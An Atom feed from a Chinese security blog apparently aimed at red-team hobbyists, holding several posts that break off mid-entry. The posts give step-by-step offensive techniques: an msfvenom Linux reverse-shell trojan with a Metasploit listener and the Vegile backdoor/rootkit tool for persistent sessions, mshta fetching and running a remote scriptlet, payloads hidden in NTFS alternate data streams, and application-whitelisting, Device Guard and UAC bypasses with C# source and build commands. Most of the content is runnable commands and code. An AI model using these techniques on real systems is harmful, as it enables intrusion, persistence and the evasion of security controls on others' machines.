<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Demonsec</title>
  
  <subtitle>Demonsec’S blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="www.ggsec.cn/"/>
  <updated>2017-09-17T13:46:58.000Z</updated>
  <id>www.ggsec.cn/</id>
  
  <author>
    <name>Demon‘blog | 没有绝对安全的系统</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>即刻安全纯技术交流群</title>
    <link href="www.ggsec.cn/jishu.html"/>
    <id>www.ggsec.cn/jishu.html</id>
    <published>2020-08-27T12:39:19.000Z</published>
    <updated>2017-09-17T13:46:58.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/%E5%A3%81%E7%BA%B8.jpg" alt="enter description here"><br><a id="more"></a></p><p> &nbsp; 其实我自己也想了很多很多，其实有一段时间比较低迷，有想过退出这个圈子，但是最后还是很多位朋友鼓励我，不要放弃，话实话进入这个圈子，也算是刚刚好一年了，个人也是一位业余爱好者的身份，来进行和你们交流和探讨，自己也是忧郁了很久很久，最终 看到咱们即刻群，基本都是整天水群，斗图，我看着实在是不忍心，即刻安全也是我的一部分，我也是其中的一份子，我的开始就是即刻安全！！即刻安全花费了我的很多心血，所以我重新开始整段群，创建此群的初衷就是，无斗图、无广告、无水群的纯技术交流群。<br> &nbsp;<br> 感谢各位朋友粉丝的大力支持，也是才有我们即刻安全的今天。<br> 如有志同道合的朋友，欢迎加入我们即刻安全纯技术交流群：307283889<br> 希望进群的朋友能遵守规则：莫斗图、莫水群，希望能打造更好的技术交流氛围</p><pre><code>特此：即刻安全团体敬上                Demon  2017.8.27</code></pre><p>&nbsp;<br>&nbsp;</p><p><img src="http://ojg8j426f.bkt.clouddn.com/BA873B7BBDED07564E11CA6736849726.png" alt="enter description here"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ojg8j426f.bkt.clouddn.com/%E5%A3%81%E7%BA%B8.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Vegile_Linux_Backdoor</title>
    <link href="www.ggsec.cn/Vegile-Linux-Backdoor.html"/>
    <id>www.ggsec.cn/Vegile-Linux-Backdoor.html</id>
    <published>2018-01-19T16:27:15.000Z</published>
    <updated>2018-01-20T10:54:38.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/3A4BDF482B386E4C1B18FB9DA91E478A.png" alt="enter description here"><br><a id="more"></a></p><h2 id="视频演示"><a href="#视频演示" class="headerlink" title="视频演示"></a>视频演示</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'http://oc78wb8cz.bkt.clouddn.com/Vegile_Linux_Backdoor.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="//cytroncdn.videojj.com/latest/Iva.js"></script><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/Screetsec/Vegile.git</span></span><br><span class="line">cd Vegile</span><br><span class="line">chmod +x Vegile</span><br></pre></td></tr></table></figure><p><img src="http://ojg8j426f.bkt.clouddn.com/1516444135450.jpg" alt="enter description here"><br>&nbsp;</p><h2 id="Vegile帮助参数"><a href="#Vegile帮助参数" class="headerlink" title="Vegile帮助参数"></a>Vegile帮助参数</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Vegile -<span class="selector-tag">i</span> / --inject [backdoor/rootkit]  (注入)</span><br><span class="line">Vegile -u / --unlimited [backdoor/rootkit] （无数次）</span><br><span class="line">Vegile -h / --help</span><br></pre></td></tr></table></figure><h2 id="1-首先生成linux-木马"><a href="#1-首先生成linux-木马" class="headerlink" title="1.首先生成linux 木马"></a>1.首先生成linux 木马</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -<span class="selector-tag">a</span> x86 --platform linux -<span class="selector-tag">p</span> linux/x86/shell/reverse_tcp LHOST=IP LPORT=PORT -<span class="selector-tag">b</span> <span class="string">"\x00"</span> -f elf -o NAME_BACKDOOR</span><br></pre></td></tr></table></figure><p><img src="http://ojg8j426f.bkt.clouddn.com/1516444270799.jpg" alt="enter description here"></p><h2 id="2-建立监听"><a href="#2-建立监听" class="headerlink" title="2.建立监听"></a>2.建立监听</h2><p>handler.rc<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD linux/x86/shell/reverse_tcp</span><br><span class="line">set LHOST  <span class="number">192.168</span>.<span class="number">1.100</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure></p><p><img src="http://ojg8j426f.bkt.clouddn.com/1516444382477.jpg" alt="enter description here"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -r handler.rc</span><br></pre></td></tr></table></figure><p><img src="http://ojg8j426f.bkt.clouddn.com/1516445509621.jpg" alt="enter description here"><br>  得到一次会话<br><img src="http://ojg8j426f.bkt.clouddn.com/1516445482085.jpg" alt="enter description here"></p><h2 id="得到会话"><a href="#得到会话" class="headerlink" title="得到会话"></a>得到会话</h2><p>并无限制的发送会话<br><img src="http://ojg8j426f.bkt.clouddn.com/1516445549295.jpg" alt="enter description here"><br>包括把整个文件夹删除 还在 无限制的发送会话<br><img src="http://ojg8j426f.bkt.clouddn.com/1516444498027.jpg" alt="enter description here"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ojg8j426f.bkt.clouddn.com/3A4BDF482B386E4C1B18FB9DA91E478A.png&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Metasploit" scheme="www.ggsec.cn/categories/Metasploit/"/>
    
    
      <category term="Metasploit" scheme="www.ggsec.cn/tags/Metasploit/"/>
    
  </entry>
  
  <entry>
    <title>Image_File_Execution_Options_cmd</title>
    <link href="www.ggsec.cn/Image-File-Execution-Options-cmd.html"/>
    <id>www.ggsec.cn/Image-File-Execution-Options-cmd.html</id>
    <published>2018-01-18T12:42:35.000Z</published>
    <updated>2018-01-18T13:02:13.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/20BCA22A407A95A1EB5A086651EEA1FA.png" alt="enter description here"><br><a id="more"></a></p><h2 id="视频演示"><a href="#视频演示" class="headerlink" title="视频演示"></a>视频演示</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'http://oc78wb8cz.bkt.clouddn.com/Image_File_Execution_Options_cmd.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="//cytroncdn.videojj.com/latest/Iva.js"></script><p><a href="https://neonprimetime.blogspot.com/2018/01/java-adwind-rat-uses-image-file.html?utm_campaign=crowdfire&amp;utm_content=crowdfire&amp;utm_medium=social&amp;utm_source=twitter%232362224631-tw%231515608604431" target="_blank" rel="noopener">https://neonprimetime.blogspot.com/2018/01/java-adwind-rat-uses-image-file.html?utm_campaign=crowdfire&amp;utm_content=crowdfire&amp;utm_medium=social&amp;utm_source=twitter%232362224631-tw%231515608604431</a><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1516280301173.jpg" alt="enter description here"><br>&nbsp;</p><p>恶意代码中，批量的程序，  启动时 启动 svchost.exe<br><img src="http://ojg8j426f.bkt.clouddn.com/1516280341723.jpg" alt="enter description here"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ojg8j426f.bkt.clouddn.com/20BCA22A407A95A1EB5A086651EEA1FA.png&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Windows" scheme="www.ggsec.cn/categories/Windows/"/>
    
    
      <category term="Windows" scheme="www.ggsec.cn/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>Mshta_RegSvcsRegAsmBypass</title>
    <link href="www.ggsec.cn/mshta-RegSvcsRegAsmBypass.html"/>
    <id>www.ggsec.cn/mshta-RegSvcsRegAsmBypass.html</id>
    <published>2018-01-17T13:07:49.000Z</published>
    <updated>2018-01-17T14:24:48.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/7fd532a8d32ff025ea824eeaa3e3d9b7.jpg" alt="enter description here"><br><a id="more"></a></p><h2 id="regsvcs-exe"><a href="#regsvcs-exe" class="headerlink" title="regsvcs.exe"></a>regsvcs.exe</h2><p>demon.ps1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$key = &apos;BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq</span><br><span class="line">/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbi</span><br><span class="line">x8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLi</span><br><span class="line">cweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7Fbd</span><br><span class="line">gpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/t</span><br><span class="line">qcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL</span><br><span class="line">6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4=&apos;</span><br><span class="line">$Content = [System.Convert]::FromBase64String($key)</span><br><span class="line">Set-Content key.snk -Value $Content -Encoding Byte</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /out:regsvcs.dll /keyfile:key.snk RegSvcsRegAsmBypass.cs</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe regsvcs.dll</span><br></pre></td></tr></table></figure></p><p>Github : <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/RegSvcsRegAsmBypass.cs" target="_blank" rel="noopener">https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/RegSvcsRegAsmBypass.cs</a></p><p>RegSvcsRegAsmBypass.cs<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.EnterpriseServices;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line">namespace regsvcser</span><br><span class="line">&#123; </span><br><span class="line">    public class Bypass : ServicedComponent</span><br><span class="line">    &#123;</span><br><span class="line">        public Bypass() &#123; Console.WriteLine("I am a basic COM Object"); &#125;</span><br><span class="line">[ComRegisterFunction] <span class="comment">//This executes if registration is successful</span></span><br><span class="line">public static void RegisterClass ( string key )</span><br><span class="line">&#123;</span><br><span class="line">System.Diagnostics.Process.Start("calc.exe");</span><br><span class="line">&#125;</span><br><span class="line">[ComUnregisterFunction] <span class="comment">//This executes if registration fails</span></span><br><span class="line">public static void UnRegisterClass ( string key )</span><br><span class="line">&#123;</span><br><span class="line">System.Diagnostics.Process.Start("calc.exe");</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="http://ojg8j426f.bkt.clouddn.com/1516196533988.jpg" alt="enter description here"></p><h2 id="mshta-exe"><a href="#mshta-exe" class="headerlink" title="mshta.exe"></a>mshta.exe</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/atomic-dev-cs/Windows/Payloads/mshta.sct").Exec();close();</span><br></pre></td></tr></table></figure><p><img src="http://ojg8j426f.bkt.clouddn.com/61EF8F4066E2C47D823299E7D9B7C121.jpg" alt="enter description here"></p><p><img src="http://ojg8j426f.bkt.clouddn.com/DB6212DEA5763595C96DB3BE85ABD29A.jpg" alt="enter description here"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ojg8j426f.bkt.clouddn.com/7fd532a8d32ff025ea824eeaa3e3d9b7.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Windows" scheme="www.ggsec.cn/categories/Windows/"/>
    
    
      <category term="Windows" scheme="www.ggsec.cn/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>维权访问-ADS数据流</title>
    <link href="www.ggsec.cn/APT.html"/>
    <id>www.ggsec.cn/APT.html</id>
    <published>2018-01-17T12:47:34.000Z</published>
    <updated>2018-01-20T11:25:24.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/IMG_2231.JPG" alt="enter description here"><br><a id="more"></a></p><h2 id="TeamViewer13"><a href="#TeamViewer13" class="headerlink" title="TeamViewer13"></a>TeamViewer13</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C :\&gt;type :\temp\helloworld.hta &gt;&quot;C :\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:helloworld.hta&quot;</span><br><span class="line">C :\&gt;mshta&quot;c :\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:helloworld.hta&quot;</span><br></pre></td></tr></table></figure><p><img src="http://ojg8j426f.bkt.clouddn.com/F2ABBAF5D93F6A45A6F005F907DFC77D.png" alt="enter description here"></p><p><img src="http://ojg8j426f.bkt.clouddn.com/IMG_2229.JPG" alt="enter description here"></p><p><img src="http://ojg8j426f.bkt.clouddn.com/IMG_2231.JPG" alt="enter description here"></p><h2 id="2-PHP"><a href="#2-PHP" class="headerlink" title="2.PHP"></a>2.PHP</h2><p>未寄宿 可以执行<br><img src="http://ojg8j426f.bkt.clouddn.com/3ADCD300BE41699E206A58A27C3E5346.jpg" alt="enter description here"></p><p>删除文件<br><img src="http://ojg8j426f.bkt.clouddn.com/7A430BB5C008502F29CA155414350C39.jpg" alt="enter description here"></p><p>删除文件—-寄宿数据流成功，并可以运行<br><img src="http://ojg8j426f.bkt.clouddn.com/FF6700C8B27E0C50A1DE7BFCC9D92867.jpg" alt="enter description here"></p><h2 id="3-Control"><a href="#3-Control" class="headerlink" title="3.Control"></a>3.Control</h2><p><img src="http://ojg8j426f.bkt.clouddn.com/0B832B73B79537BE95569BD0AFC2C61A.jpg" alt="enter description here"></p><p><img src="http://ojg8j426f.bkt.clouddn.com/DT7xuuMXcAESY2i.jpg" alt="enter description here"></p><p>链接资料：<a href="https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/" target="_blank" rel="noopener">https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/</a></p><p><a href="https://twitter.com/bohops/status/954466315913310209" target="_blank" rel="noopener">https://twitter.com/bohops/status/954466315913310209</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ojg8j426f.bkt.clouddn.com/IMG_2231.JPG&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Windows" scheme="www.ggsec.cn/categories/Windows/"/>
    
    
      <category term="Windows" scheme="www.ggsec.cn/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>Subtee_AllTheThings</title>
    <link href="www.ggsec.cn/Subtee-AllTheThings.html"/>
    <id>www.ggsec.cn/Subtee-AllTheThings.html</id>
    <published>2018-01-14T11:25:30.000Z</published>
    <updated>2018-01-14T11:47:20.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/3F0D6AE9EBB9862FD2C7093C72B71FB0.png" alt="enter description here"><br><a id="more"></a><br>Subtee的项目我已经上传了我的GitHub了。<br><a href="https://github.com/demonsec666/Subtee_AllTheThings" target="_blank" rel="noopener">https://github.com/demonsec666/Subtee_AllTheThings</a></p><p><img src="http://ojg8j426f.bkt.clouddn.com/EAD95DD2-983D-414E-9001-A437C9FF6E4A.png" alt="enter description here"></p><p>Includes 5 Known Application Whitelisting Bypass Techniques in One File.</p><h3 id="1-InstallUtil-exe"><a href="#1-InstallUtil-exe" class="headerlink" title="1. InstallUtil.exe"></a>1. InstallUtil.exe</h3><h3 id="2-Regsvcs-exe"><a href="#2-Regsvcs-exe" class="headerlink" title="2. Regsvcs.exe"></a>2. Regsvcs.exe</h3><h3 id="3-Regasm-exe"><a href="#3-Regasm-exe" class="headerlink" title="3. Regasm.exe"></a>3. Regasm.exe</h3><h2 id="4-regsvr32-exe"><a href="#4-regsvr32-exe" class="headerlink" title="4. regsvr32.exe"></a>4. regsvr32.exe</h2><h3 id="5-rundll32-exe"><a href="#5-rundll32-exe" class="headerlink" title="5. rundll32.exe"></a>5. rundll32.exe</h3><h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage:"></a>Usage:</h2><h2 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h2><p>x86 - C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll</p><p>x64 - C:\Windows\Microsoft.NET\Framework64\v4.0.3031964\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll</p><h2 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h2><p>x86 C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe AllTheThings.dll</p><p>x64 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe AllTheThings.dll</p><h2 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h2><p>x86 C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U AllTheThings.dll</p><p>x64 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U AllTheThings.dll</p><h2 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h2><p>regsvr32 /s  /u AllTheThings.dll –&gt;Calls DllUnregisterServer</p><p>regsvr32 /s AllTheThings.dll –&gt; Calls DllRegisterServer</p><h2 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h2><p>rundll32 AllTheThings.dll,EntryPoint</p><hr>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ojg8j426f.bkt.clouddn.com/3F0D6AE9EBB9862FD2C7093C72B71FB0.png&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Windows" scheme="www.ggsec.cn/categories/Windows/"/>
    
    
      <category term="Windows" scheme="www.ggsec.cn/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>.NET_CSC_calc</title>
    <link href="www.ggsec.cn/NET-CS-calc.html"/>
    <id>www.ggsec.cn/NET-CS-calc.html</id>
    <published>2018-01-09T10:43:09.000Z</published>
    <updated>2018-01-09T11:01:34.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/74AECD274FD87CA84354DE01CC5BCFB5.jpg" alt="enter description here"><br><a id="more"></a></p><h2 id="视频演示"><a href="#视频演示" class="headerlink" title="视频演示"></a>视频演示</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'http://oc78wb8cz.bkt.clouddn.com/Net_CSC_calc.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="//cytroncdn.videojj.com/latest/Iva.js"></script><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\Windows\Microsoft.NET\Framework\v4.<span class="number">0.30319</span>\csc<span class="selector-class">.exe</span> demon.cs</span><br></pre></td></tr></table></figure><p><img src="http://ojg8j426f.bkt.clouddn.com/1515495219353.jpg" alt="enter description here"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">namespace HelloWorld</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">         System.Diagnostics.Process.Start("calc.exe");  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://ojg8j426f.bkt.clouddn.com/1515495242360.jpg" alt="enter description here"></p><p><img src="http://ojg8j426f.bkt.clouddn.com/1515495313615.jpg" alt="enter description here"></p><p><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/compiler-options/command-line-building-with-csc-exe" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/compiler-options/command-line-building-with-csc-exe</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ojg8j426f.bkt.clouddn.com/74AECD274FD87CA84354DE01CC5BCFB5.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Windows" scheme="www.ggsec.cn/categories/Windows/"/>
    
    
      <category term="Windows" scheme="www.ggsec.cn/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>每日安全干货及动态--第二期</title>
    <link href="www.ggsec.cn/%E6%AF%8F%E6%97%A5%E5%AE%89%E5%85%A8%E5%B9%B2%E8%B4%A7%E5%8F%8A%E5%8A%A8%E6%80%81-1.html"/>
    <id>www.ggsec.cn/每日安全干货及动态-1.html</id>
    <published>2018-01-09T09:57:30.000Z</published>
    <updated>2018-01-09T10:38:21.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/850.jpg" alt="enter description here"><br><a id="more"></a></p><h2 id="安全项目"><a href="#安全项目" class="headerlink" title="安全项目"></a>安全项目</h2><p> 使用Vulhub一键搭建漏洞测试靶场<br><a href="https://vulhub.org/#/index/" target="_blank" rel="noopener">https://vulhub.org/#/index/</a></p><p>CVE-2017-11882<br><a href="https://github.com/unamer/CVE-2017-11882/" target="_blank" rel="noopener">https://github.com/unamer/CVE-2017-11882/</a><br>&nbsp;</p><h2 id="1-Forfiles-弹计算器"><a href="#1-Forfiles-弹计算器" class="headerlink" title="1.Forfiles ( 弹计算器)"></a>1.Forfiles ( 弹计算器)</h2><pre><code>forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe</code></pre><p><a href="https://technet.microsoft.com/zh-cn/library/cc753551(v=ws.10).aspx" target="_blank" rel="noopener">https://technet.microsoft.com/zh-cn/library/cc753551(v=ws.10).aspx</a><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/DA719C3B-B1BB-4833-A714-74126C52B141.jpg" alt="enter description here"></p><h3 id="演示如图："><a href="#演示如图：" class="headerlink" title="演示如图："></a>演示如图：</h3><p> <img src="http://ojg8j426f.bkt.clouddn.com/1515492708640.jpg" alt="enter description here"></p><p> &nbsp;</p><h2 id="2-CVE-2017-8625-HTML-IE"><a href="#2-CVE-2017-8625-HTML-IE" class="headerlink" title="2.CVE-2017-8625 -HTML-IE"></a>2.CVE-2017-8625 -HTML-IE</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;script type=<span class="string">"text/jscript"</span>&gt;</span><br><span class="line">var r =new ActiveXObject("Wscript.shell").Run("calc.exe"); </span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>使用CVE-2017-8625 – 绕过设备保护UMCI</p><p><a href="https://msitpros.com/?p=3909" target="_blank" rel="noopener">https://msitpros.com/?p=3909</a></p><p><img src="http://ojg8j426f.bkt.clouddn.com/1515493015402.jpg" alt="enter description here"></p><p><a href="https://enigma0x3.net/2017/08/24/umci-vs-internet-explorer-exploring-cve-2017-8625/?utm_campaign=crowdfire&amp;utm_content=crowdfire&amp;utm_medium=social&amp;utm_source=twitter#238993254-tw#1503674775121" target="_blank" rel="noopener">https://enigma0x3.net/2017/08/24/umci-vs-internet-explorer-exploring-cve-2017-8625/?utm_campaign=crowdfire&amp;utm_content=crowdfire&amp;utm_medium=social&amp;utm_source=twitter#238993254-tw#1503674775121</a></p><p><img src="http://ojg8j426f.bkt.clouddn.com/1515492999613.jpg" alt="enter description here"></p><h3 id="演示如图：-1"><a href="#演示如图：-1" class="headerlink" title="演示如图："></a>演示如图：</h3><p><img src="http://ojg8j426f.bkt.clouddn.com/1515493033127.jpg" alt="enter description here"></p><p>&nbsp;</p><h2 id="3-UAC-TokenMagic-ps1绕UAC"><a href="#3-UAC-TokenMagic-ps1绕UAC" class="headerlink" title="3.UAC-TokenMagic.ps1绕UAC"></a>3.UAC-TokenMagic.ps1绕UAC</h2><p><a href="https://github.com/FuzzySecurity/PowerShell-Suite" target="_blank" rel="noopener">https://github.com/FuzzySecurity/PowerShell-Suite</a></p><p>参考：</p><p><a href="https://tyranidslair.blogspot.co.uk/2017/05/reading-your-way-around-uac-part-1.html" target="_blank" rel="noopener">https://tyranidslair.blogspot.co.uk/2017/05/reading-your-way-around-uac-part-1.html</a><br><a href="https://tyranidslair.blogspot.co.uk/2017/05/reading-your-way-around-uac-part-2.html" target="_blank" rel="noopener">https://tyranidslair.blogspot.co.uk/2017/05/reading-your-way-around-uac-part-2.html</a><br><a href="https://tyranidslair.blogspot.co.uk/2017/05/reading-your-way-around-uac-part-3.html" target="_blank" rel="noopener">https://tyranidslair.blogspot.co.uk/2017/05/reading-your-way-around-uac-part-3.html</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.EXAMPLE</span> C:\PS&gt; UAC-TokenMagic -BinPath C:\Windows\System32\cmd<span class="selector-class">.exe</span> .</span><br><span class="line">EXAMPLE C:\PS&gt; UAC-TokenMagic -BinPath C:\Windows\System32\cmd<span class="selector-class">.exe</span> -Args <span class="string">"/c ca</span></span><br><span class="line"><span class="string">lc.exe"</span> -ProcPID <span class="number">1116</span></span><br><span class="line">C:\PS&gt; UAC-TokenMagic -BinPath C:\Windows\System32\cmd<span class="selector-class">.exe</span>  -ProcPID <span class="number">3624</span></span><br></pre></td></tr></table></figure><h3 id="如图所示："><a href="#如图所示：" class="headerlink" title="如图所示："></a>如图所示：</h3><p><img src="http://ojg8j426f.bkt.clouddn.com/7842CEE459C87DF22D96DF1C051EE0DC.jpg" alt="enter description here"><br>&nbsp;</p><h2 